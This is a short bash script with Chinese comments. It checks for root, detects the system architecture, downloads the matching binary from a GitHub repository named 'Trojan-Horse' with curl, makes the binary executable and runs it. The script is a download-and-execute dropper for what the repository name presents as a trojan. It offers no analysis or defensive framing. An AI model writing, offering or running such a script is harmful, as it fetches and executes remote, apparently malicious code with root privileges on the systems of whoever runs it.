#!/bin/bash

# 检查是否需要 root 权限（可根据需要注释掉）
if [ "$(id -u)" != "0" ]; then
   echo "This script may require root permissions. Try sudo $0"
   exit 1
fi

# 检测系统架构
ARCH=$(uname -m)
echo "Detected architecture: $ARCH"

# 定义仓库的 raw 文件基础 URL（假设分支为 main）
REPO_URL="https://raw.githubusercontent.com/Tiancaizhi9098/Trojan-Horse/main"

# 根据架构选择对应的程序文件
case "$ARCH" in
    i386|i686)
        PROGRAM_NAME="linux_386"
        ;;
    x86_64)
        PROGRAM_NAME="linux_amd64"
        ;;
    aarch64|arm64)
        PROGRAM_NAME="linux_aarch64"
        ;;
    arm|armv5*)
        PROGRAM_NAME="linux_arm5"
        ;;
    armv6*)
        PROGRAM_NAME="linux_arm6"
        ;;
    armv7*)
        PROGRAM_NAME="linux_arm7"
        ;;
    mips)
        PROGRAM_NAME="linux_mips"
        ;;
    mips64)
        PROGRAM_NAME="linux_mips64"
        ;;
    mips64el)
        PROGRAM_NAME="linux_mips64el"
        ;;
    mipsel)
        PROGRAM_NAME="linux_mipsel"
        ;;
    *)
        echo "Error: Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

# 构造下载 URL
PROGRAM_URL="${REPO_URL}/${PROGRAM_NAME}"

# 下载程序
echo "Downloading $PROGRAM_NAME..."
curl -L -o "$PROGRAM_NAME" "$PROGRAM_URL" || {
    echo "Error: Failed to download $PROGRAM_NAME"
    exit 1
}

# 验证文件是否下载成功
if [ ! -f "$PROGRAM_NAME" ]; then
    echo "Error: $PROGRAM_NAME not found after download"
    exit 1
fi

# 赋予执行权限
chmod +x "$PROGRAM_NAME"
echo "Permissions granted to $PROGRAM_NAME"

# 执行程序
echo "Running $PROGRAM_NAME..."
./"$PROGRAM_NAME" || {
    echo "Error: Failed to execute $PROGRAM_NAME"
    exit 1
}

# 可选：清理下载的文件
# rm "$PROGRAM_NAME"
# echo "Cleaned up $PROGRAM_NAME"

echo "Execution completed successfully!"
